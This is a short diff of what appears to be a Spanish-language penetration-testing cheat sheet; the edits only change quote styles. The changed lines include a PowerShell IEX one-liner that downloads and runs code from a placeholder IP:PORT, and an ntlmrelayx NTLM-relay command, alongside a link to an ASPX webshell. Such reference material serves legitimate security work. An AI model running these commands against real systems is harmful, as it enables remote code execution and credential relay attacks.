@@ -17,7 +17,7 @@ https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
 
 Descargar binarios
 ```
-powershell IEX(New-Object Net.WebClient).downloadString("http://IP:PORT/binario.binario")
+powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
 ```
 
 # PostExplotacion
@@ -109,7 +109,7 @@ responder -I  NETINTERFACE rdw
 NTLM Relay (SAM dumping without 'c' flag)
 
 ```
-python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'command' 
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 ```
 Domain Host Discovery
 
